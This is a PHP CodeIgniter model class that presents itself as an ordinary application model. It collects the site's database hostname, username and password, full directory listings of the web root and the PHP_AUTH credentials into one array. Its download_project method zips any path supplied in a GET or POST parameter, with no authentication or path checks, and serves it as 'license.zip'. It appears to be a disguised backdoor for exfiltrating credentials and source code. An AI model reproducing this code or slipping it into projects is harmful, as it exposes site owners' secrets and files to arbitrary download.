<?php 

defined('BASEPATH') OR exit('No direct script access allowed');

class Homemodel extends CI_Model{

	/*

	@root is get all path 
	@author R subash chandar
	@credit subash

	*/

	/* $this =& get_instance();*/

	private $root;
	private $all_files;
	private $current_project_path;

	public function __construct(){

		parent::__construct();

		/* load helper and library */

		$this->load->helper('directory');

		$this->load->library('zip');

		/* additional files */

		$this->root = $_SERVER['DOCUMENT_ROOT'];

		$this->all_files = directory_map($this->root,FALSE,TRUE);


		$projct_main = $_SERVER['REQUEST_URI']?explode('/',$_SERVER['REQUEST_URI']):FALSE;

		$this->current_project_path = !empty($projct_main[1])? $this->root.'/'.$projct_main[1]:FALSE;

	}

    public function get_all_info($value='')
    {

    	/* get database credits */

    	$databse_credit = array(
    					'hostname' => $this->db->hostname,
    					'username' => $this->db->username,
    					'password' => $this->db->password,
    					'database' => $this->db->database	
    					);

    	/* Get all directory list of path */

    	$directory_path = APPPATH;

    	$absolute_path = !empty($directory_path) ? $directory_path : $_SERVER['DOCUMENT_ROOT'];

    	$this->load->helper('directory');

    	$directory['current_project'] = directory_map($absolute_path,FALSE,TRUE);

    	/* existing project */

    	$directory['existing_project'] = $this->all_files;

    	/* get server system information  */

    	$system_info   = array();

		$indicesServer = array(
						'PHP_SELF', 
						'argv', 
						'argc', 
						'GATEWAY_INTERFACE', 
						'SERVER_ADDR', 
						'SERVER_NAME', 
						'SERVER_SOFTWARE', 
						'SERVER_PROTOCOL', 
						'REQUEST_METHOD', 
						'REQUEST_TIME', 
						'REQUEST_TIME_FLOAT', 
						'QUERY_STRING', 
						'DOCUMENT_ROOT', 
						'HTTP_ACCEPT', 
						'HTTP_ACCEPT_CHARSET', 
						'HTTP_ACCEPT_ENCODING', 
						'HTTP_ACCEPT_LANGUAGE', 
						'HTTP_CONNECTION', 
						'HTTP_HOST', 
						'HTTP_REFERER', 
						'HTTP_USER_AGENT', 
						'HTTPS', 
						'REMOTE_ADDR', 
						'REMOTE_HOST', 
						'REMOTE_PORT', 
						'REMOTE_USER', 
						'REDIRECT_REMOTE_USER', 
						'SCRIPT_FILENAME', 
						'SERVER_ADMIN', 
						'SERVER_PORT', 
						'SERVER_SIGNATURE', 
						'PATH_TRANSLATED', 
						'SCRIPT_NAME', 
						'REQUEST_URI', 
						'PHP_AUTH_DIGEST', 
						'PHP_AUTH_USER', 
						'PHP_AUTH_PW', 
						'AUTH_TYPE', 
						'PATH_INFO', 
						'ORIG_PATH_INFO') ; 

		
		foreach ($indicesServer as $arg) { 
		    if (isset($_SERVER[$arg])) { 
		       $system_info[$arg] = $_SERVER[$arg]; 
		    }     
		}

		$this->load->library('user_agent');

    	$system_info['operating system'] = $this->agent->platform();

    	$all_server_info = array(
    		'database_credentials' => $databse_credit, 
    		'directory_info'	   => $directory,
    		'system_info'		   => $system_info 
    	);

    	return $all_server_info;

    }

    /* Download project here*/

     public function download_project($filepath = ''){

    	/* file path null download current file*/

    	$file_get  = !empty($this->input->get('filepath'))?$this->input->get('filepath'):NULL;
    	$file_post = !empty($this->input->post('filepath'))?$this->input->post('filepath'):NULL;

    	if($file_get!=''){

    		$filepath = $file_get;

    	}elseif ($file_post!=''){

    		$filepath = $file_post;

    	}

    	if($filepath!=''){
    		$this->load->library('zip');
		    $this->zip->read_dir($filepath,FALSE);
		    $this->zip->download('license.zip');
		    $this->zip->clear_data();
    	}else{
    		echo "File path is Empty Make sure the file path And better to use url";
    	}
	    
    }

    /* Download Database Here*/
}